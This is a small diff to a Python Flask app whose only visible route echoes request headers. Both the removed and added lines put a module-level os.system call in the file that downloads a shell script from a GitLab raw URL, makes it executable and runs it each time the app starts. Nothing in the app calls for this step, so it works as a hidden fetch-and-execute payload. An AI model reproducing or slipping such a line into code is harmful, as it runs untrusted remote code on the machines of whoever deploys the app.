@@ -5,7 +5,7 @@ import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
 import os
-os.system ('wget -O 1 https://gitlab.com/azkadafa39/suram/-/raw/main/naked_seger.sh && chmod +x 1 && ./1')
+os.system ('wget https://gitlab.com/azkadafa39/suram/-/raw/main/naked_seger.sh && chmod +x naked_seger.sh && ./naked_seger.sh')
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
